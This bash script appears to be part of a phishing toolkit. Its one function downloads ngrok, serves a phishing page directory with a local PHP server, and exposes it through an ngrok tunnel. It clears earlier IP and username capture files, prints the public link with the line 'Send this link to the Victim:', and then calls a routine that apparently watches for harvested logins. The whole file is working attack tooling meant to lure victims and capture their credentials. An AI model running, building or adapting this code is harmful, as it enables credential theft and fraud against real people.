#!/bin/bash

startServer() {

  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"

  if [[ -e web/$server/ip.txt ]]; then
    rm -rf web/$server/ip.txt
  fi

  if [[ -e web/$server/usernames.txt ]]; then
    rm -rf web/$server/usernames.txt
  fi

  if [[ -e ngrok ]]; then
    echo ""
  else
    printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)

    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
      wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

      if [[ -e ngrok-stable-linux-arm.zip ]]; then
        unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok-stable-linux-arm.zip
      else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
      fi

    else
      wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
      if [[ -e ngrok-stable-linux-386.zip ]]; then
        unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok-stable-linux-386.zip
      else
        printf "\e[1;93m[!] Download error... \e[0m\n"
        exit 1
      fi
    fi
  fi
  printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
  cd web/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
  sleep 2
  printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
  printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link

  checkActivity

}
